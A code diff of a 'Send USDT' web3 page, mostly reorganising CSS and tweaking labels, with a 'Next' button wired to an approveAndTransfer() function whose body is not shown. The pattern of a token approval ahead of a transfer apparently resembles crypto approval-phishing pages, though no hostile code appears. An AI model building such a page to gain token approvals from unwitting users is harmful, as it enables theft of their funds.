@@ -4,91 +4,19 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Send USDT</title>
+  <link rel="stylesheet" href="style.css" />
   <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
   <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, sans-serif;
-      margin: 0;
-      padding: 0;
-      background: #fff;
-      color: #333;
-    }
-
-    .container {
-      max-width: 480px;
-      margin: 0 auto;
-      padding: 25px 15px;
-    }
-
-    label {
-      display: block;
-      margin: 20px 0 6px;
-      color: #888;
-      font-size: 14px;
-    }
-
-    .input-wrapper,
-    .amount-wrapper {
-      display: flex;
-      align-items: center;
-      border: 1px solid #ddd;
-      border-radius: 8px;
-      padding: 12px;
-      background-color: #fff;
-      width: 100%;
-      box-sizing: border-box;
-    }
-
-    .input-wrapper input,
-    .amount-wrapper input {
-      border: none;
-      outline: none;
-      font-size: 16px;
-      flex: 1;
-    }
-
-    .input-wrapper span,
-    .amount-wrapper span {
-      margin-left: 10px;
-      font-weight: bold;
-      color: #333;
-      cursor: pointer;
-      font-size: 14px;
-    }
-
-    .amount-line {
-      margin-top: 5px;
-      font-size: 14px;
-      color: #666;
-    }
-
     .btn-center {
       display: flex;
       justify-content: center;
     }
-
     .btn-center button {
-      margin-top: 35px;
-      width: 100%;
-      padding: 15px;
-      font-size: 16px;
-      background-color: #002fff;
-      color: #fff;
-      font-weight: bold;
-      border: none;
-      border-radius: 25px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
+      max-width: 300px;
+    }
+    .input-wrapper span,
+    .amount-wrapper span {
       cursor: pointer;
-    }
-
-    .btn-center button:active {
-      transform: scale(0.98);
-    }
-
-    @media (max-width: 600px) {
-      .container {
-        padding: 15px;
-      }
     }
   </style>
 </head>
@@ -108,15 +36,15 @@
       <span onclick="fillMax()">Max</span>
     </div>
 
-    <div class="amount-line" id="fiat">= $0.00</div>
+    <div class="amount-line" id="fiat">≈ $0.00</div>
 
     <div class="btn-center">
       <button onclick="approveAndTransfer()">Next</button>
     </div>
   </div>
 
+  <!-- Trust Wallet Chain Fix -->
   <script>
-    // Auto reload for Trust Wallet blank bug
     window.addEventListener("load", () => {
       if (document.body.innerHTML.trim() === "") {
         location.reload();
